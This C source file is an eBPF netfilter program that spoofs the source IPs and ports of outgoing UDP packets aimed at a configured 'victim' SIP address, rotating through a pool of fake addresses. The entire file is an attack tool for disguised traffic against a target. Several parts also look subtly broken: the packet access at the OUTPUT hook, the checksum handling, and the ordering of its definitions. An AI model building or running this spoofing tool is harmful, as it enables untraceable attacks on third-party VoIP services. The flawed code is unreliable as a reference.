/*
 * eBPF Netfilter Hook Program for SIP Packet Spoofing
 * 
 * This program attaches to the netfilter OUTPUT hook to intercept packets
 * before the kernel routing decision, allowing spoofing of local IPs.
 * 
 * Minimal overhead design:
 * - Direct packet modification in kernel space
 * - No userspace context switches for spoofing
 * - Efficient round-robin IP selection via BPF maps
 */

#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define MAX_SPOOF_IPS 256
#define EPHEMERAL_PORT_MIN 49152
#define EPHEMERAL_PORT_MAX 65535

/* BPF Maps for configuration and state */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct config);
} config_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_SPOOF_IPS);
    __type(key, __u32);
    __type(value, __u32);
} spoof_ips_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} state_map SEC(".maps");

/* Configuration structure */
struct config {
    __u32 victim_ip;
    __u16 victim_port;
    __u32 spoof_count;
    __u32 enabled;
};

/* State structure for round-robin */
struct state {
    __u32 next_ip_index;
    __u32 packet_count;
};

/* Generate pseudo-random ephemeral port */
static __always_inline __u16 get_random_port(__u32 seed) {
    __u32 rand = seed * 1103515245 + 12345;
    return EPHEMERAL_PORT_MIN + (rand % (EPHEMERAL_PORT_MAX - EPHEMERAL_PORT_MIN + 1));
}

/* Update IP and UDP checksums incrementally */
static __always_inline void update_checksums(struct iphdr *iph, struct udphdr *udph,
                                            __u32 old_ip, __u32 new_ip,
                                            __u16 old_port, __u16 new_port) {
    /* Update IP checksum for source IP change */
    __u32 ip_sum = bpf_ntohs(iph->check);
    ip_sum = (~ip_sum & 0xFFFF) + (~old_ip & 0xFFFF) + (old_ip >> 16);
    ip_sum = (ip_sum >> 16) + (ip_sum & 0xFFFF);
    ip_sum += (~old_ip >> 16) + (new_ip & 0xFFFF) + (new_ip >> 16);
    ip_sum = (ip_sum >> 16) + (ip_sum & 0xFFFF);
    iph->check = bpf_htons(~ip_sum & 0xFFFF);

    /* UDP checksum update (simplified - set to 0 for performance) */
    udph->check = 0;
}

SEC("netfilter")
int netfilter_spoof_prog(struct bpf_nf_ctx *ctx) {
    /* Get packet data */
    struct sk_buff *skb = ctx->skb;
    void *data = (void *)(long)skb->data;
    void *data_end = (void *)(long)skb->data_end;
    
    /* Bounds check for Ethernet header */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return NF_ACCEPT;
    
    /* Only process IP packets */
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return NF_ACCEPT;
    
    /* Bounds check for IP header */
    struct iphdr *iph = (struct iphdr *)(eth + 1);
    if ((void *)(iph + 1) > data_end)
        return NF_ACCEPT;
    
    /* Only process UDP packets */
    if (iph->protocol != IPPROTO_UDP)
        return NF_ACCEPT;
    
    /* Bounds check for UDP header */
    struct udphdr *udph = (struct udphdr *)((char *)iph + (iph->ihl * 4));
    if ((void *)(udph + 1) > data_end)
        return NF_ACCEPT;
    
    /* Get configuration */
    __u32 config_key = 0;
    struct config *cfg = bpf_map_lookup_elem(&config_map, &config_key);
    if (!cfg || !cfg->enabled)
        return NF_ACCEPT;
    
    /* Check if this packet matches our target */
    if (iph->daddr != cfg->victim_ip || udph->dest != bpf_htons(cfg->victim_port))
        return NF_ACCEPT;
    
    /* Get current state for round-robin */
    __u32 state_key = 0;
    __u32 *next_index = bpf_map_lookup_elem(&state_map, &state_key);
    if (!next_index)
        return NF_ACCEPT;
    
    /* Get spoofed IP from map */
    __u32 ip_index = *next_index % cfg->spoof_count;
    __u32 *spoof_ip = bpf_map_lookup_elem(&spoof_ips_map, &ip_index);
    if (!spoof_ip)
        return NF_ACCEPT;
    
    /* Store original values */
    __u32 old_src_ip = iph->saddr;
    __u16 old_src_port = udph->source;
    
    /* Generate new ephemeral port */
    __u32 seed = *next_index + bpf_ktime_get_ns();
    __u16 new_src_port = bpf_htons(get_random_port(seed));
    
    /* Modify packet */
    iph->saddr = *spoof_ip;
    udph->source = new_src_port;
    
    /* Update checksums */
    update_checksums(iph, udph, old_src_ip, *spoof_ip, old_src_port, new_src_port);
    
    /* Update round-robin state */
    __u32 new_index = (*next_index + 1) % cfg->spoof_count;
    bpf_map_update_elem(&state_map, &state_key, &new_index, BPF_ANY);
    
    return NF_ACCEPT;
}

char _license[] SEC("license") = "GPL";
